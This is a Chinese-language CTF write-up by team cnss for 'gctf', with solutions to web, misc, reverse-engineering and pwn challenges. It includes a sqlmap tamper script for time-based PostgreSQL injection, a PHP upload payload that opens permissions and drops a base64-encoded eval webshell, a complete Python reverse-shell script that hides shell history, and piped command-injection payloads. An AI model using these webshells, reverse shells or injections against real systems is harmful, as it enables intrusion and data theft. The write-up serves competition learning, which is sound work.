##gctf writeup, by cnss
###WEB200
	先吐槽，第一天做的时候web100表里面居然flag字段为空，就以为是个坑，到处翻表，结果是被人搅了而已，那么卡的服务器居然出的是时间盲注真是醉了。
	当url中出现大写的PG_SLEEP的时候就会返回can’t use sleep，测试小写的时候发现可以成功sleep并不拦截。因此写个tamper用sqlmap跑，tamper代码如下：
```python
def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload.replace("PG_SLEEP","pg_sleep");

return retVal
```
	sqlmap的关键参数是 --tamper xxx.py --technique T --dbms postgresql –D public –T web100 --dump  在flag字段注入出flag。

###WEB300
	Hint说会被立刻删除，因此写个php写上上级目录，放进zip中，用burp一直跑对应用户名的上传目录即可。php代码如下：
```php
<?php
$dir = dirname(__FILE__);
$basedir = $dir."/../../";
system("chmod -Rf 777 ".$basedir); //由于目录权限被搅，还要把权限设置回来
echo $basedir;
echo file_put_contents("../../luoisyourfather.php",base64_decode("DQo8P3BocCANCmlmKG1kNSgkX0dFVFsneCddKSA9PSAiZTNiN2QzZjgyM2VhODJkMmY2M2FkM2JiZmQwN2I0ZmMiKXsNCiAgICBldmFsKCRfUE9TVFsnbHVvJ10pOyANCn0NCj8+"));
?>
```
	本人上传的用户名为testluo，文件名为3.php因此burp一直get /uploads/testluo/3.php，出现200状态码即可
	成功拿到shell后在网站根目录的fl4g文件夹下发现flag。(然后就可以写脚本搅屎了)

###WEB500
	两种办法，可以用portmap把22转发出来用ssh，另一个用python写一个tty的shell反弹出来。我选择python的ttyshell，因为ssh猜密码很麻烦。Python代码如下：
```python
#!/usr/bin/python
import sys
import os
import socket
import pty

shell = "/bin/sh"

def usage(programname):
print "python connect-back door"
print "Usage: %s <conn_back_ip> <port>" % programname

def main():
if len(sys.argv) !=3:
usage(sys.argv[0])
sys.exit(1)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
s.connect((socket.gethostbyname(sys.argv[1]),int(sys.argv[2])))
print "[+]Connect OK."
except:
print "[-]Cant connect"
sys.exit(2)

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
global shell
os.unsetenv("HISTFILE")
os.unsetenv("HISTFILESIZE")
pty.spawn(shell)
s.close()

if __name__ == "__main__":
main()
```
	弹出来shell后直接su redrain，密码为弱口令asd123!@#，在/home/redrain下发现flag


###Misc 50

	网页源码里 aaencode的代码,运行,出来一个gctf{}，以为少了东西,找了半天提交了一下居然对了..

###Misc100
	递归查{} 注意从源码复制和嵌套,爆破也可以，脚本跑出来一直是267，不对( ⊙ o ⊙ )啊！
	默默+1 -1 发现266对了
```python
#-*-coding:utf-8-*-
def Count():
    s = '''the string without \\'''
    cnt = 0
    left = 0
    for i in s:
        if i == '{':
            left += 1
        if i == '}':
            if (left > 0):
                left -= 1
                cnt += 1
    print cnt

Count()
```

###Misc200/600
	http://insight-labs.org/?p=371 分离出来狗
	LSB在CSDN上有个工具,人家毕业设计 直接跑一下OK出来flag
	


###Re 1:
	simply Reverse.	
	1.py:
```python
str1 = '62C5J110119120L'
	str2 = ''
	for i in range(len(str1)):
		str2 += chr(ord(str1[i]) + 49 )

	print str2
```

###Re2:

	a interesting Reverse, use SEH to control execute process.
	breakpoint in SEH process function(0x401000) and then trigger off a exception.

	there is a simply labyrinth.

```bash
00409036  2A 2A 2A 20 20 2A 2A 20 20 2A 2A 20 2A 2A 2A 2A  ***  **  ** ****
00409046  20 2A 2A 20 2A 2A 2A 2A 2A 2A 2A 20 2A 23 20 20   ** ******* *#
00409056  20 2A 2A 20 2A 2A 2A 2A 20 2A 2A 20 20 2A 2A 20   ** **** **  **
00409066  20 2A 2A 2A 20 20 20 20 2A 2A                     ***    **
```
	everytime I can +8,-8,+1,-1
	from 0x00409046 to 0x00409053
	cannot on 0x2A,length 25.

###Re3:
	use a table to control execution.
	breakpoint on every case to switch.
	look at the parameter of every crucial function(strcmp, strlen and so on)
	input len : 13, every -0x80, compare with a string.

###Pwn1:
	no NX, a global buffer we can enter into.
	a stack overflow, no cookie.

	arrange shellcode in global buffer, use stack overflow to return to buffer,getshell.

###Pwn2:
	no NX, a global buffer we can enter into.
	a fsb, we can leak address.
	a uaf, we can jmp to anywhere.
	but we cannot write shellcode in global buffer,beacuse we use uaf, the buffer will be corrupted.

	so, leak stack address, and then use uaf return to stack buffer.

###Pwn3:
	NX, cannot execute shellcode in stack and heap.
	safe stack, cannot overflow the stack
	but,there is a fsb and a command injection.

	bypass '>', ';', '<'
	use pipe.
	but cannot getshell.
	payload "ping *|ls"
	look at the file of flag's name,flag.txt
	use payload again "ping *|cat flag.txt"
